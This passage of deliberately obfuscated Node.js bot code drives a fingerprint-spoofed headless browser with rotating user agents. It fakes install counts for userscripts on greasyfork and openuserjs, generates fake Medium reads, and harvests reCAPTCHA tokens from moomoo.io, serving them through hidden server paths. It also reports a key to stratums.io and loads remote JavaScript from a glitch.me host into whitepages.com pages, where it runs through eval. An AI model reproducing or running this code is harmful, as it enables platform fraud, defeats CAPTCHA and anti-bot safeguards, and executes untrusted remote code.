      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + W(0x16) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + V(0x6) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + X(0x1b, 'Y68j') + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + W(0x14) + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    X(0x3, 'JB!q') + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + W(0x19) + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    X(0x7, 'W*f&') + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x353 + 0x2446 + 0x5d * -0x6d
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1730 + 0x15 * 0xf5 + -0x71 * -0x7)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + Y(0xc, '%]*!')];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x808 + 0x172e + -0x1ed2 * 0x1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x19 * 0x185 + -0xb40 + -0x1 * 0x1a59), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1 * -0x614 + -0x1fe9 + 0x19d5;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x8f2 + -0x80a + -0x4 * 0x3a; w < getRandomInt(-0xd4 * 0x1f + -0x1 * 0xd29 + 0xcf2 * 0x3, -0x3cd + 0x233e + -0x1f6c); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1f * -0x667 + 0x48a7 * 0x6 + -0x19003);
        }
      }();
    }, 0x466 * 0x8 + -0x907 + -0x897 * 0x3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x987 * 0x4 + -0x26d5 * -0x1 + -0xb9;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x7f4 * 0x1 + 0x2366 + 0x6 * -0x493, 0x798 + 0x2 * -0x6c5 + 0x20c * 0x3)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x8399 + -0x769e + 0x16f67);
    }, 0x17b9 * -0x1 + 0x2320 + 0xb03 * -0x1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1d78 + -0x3f8 + 0xd6 * 0x28;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x12ce + -0x1fe3 + -0x4cd * -0xd), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1237 * 0x2 + 0x3c1 + 0x20ad), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x5fa9e + 0x59 * -0x40b3 + 0x1c7 * 0x17bf);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x97 * -0x19 + 0x1 * 0x2587 + -0x33e2);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x245f * 0x1 + 0xbc * -0x8 + -0x1db7 * 0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x792 + 0x37 * 0xc3 + 0x65 * -0x7);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = b,
    Z = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x9ad + -0x1 * 0xfd9 + 0x1987) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x22 * 0xa9 + -0x1 * -0x229d + -0x207 * 0x6));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xb77 + -0x4 * -0x80 + 0x977, D['indexOf']('\x20'));
        return B ? E['slice'](0x1 * 0x221b + -0x1040 + -0x11db, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1563 + 0x24f * 0x1a + -0x1 * -0x6d),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x3fa3 * -0x1 + 0x2 * 0xae3 + 0x50ed),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + Z(0x1),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + a0(0x18, '8A@k') + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
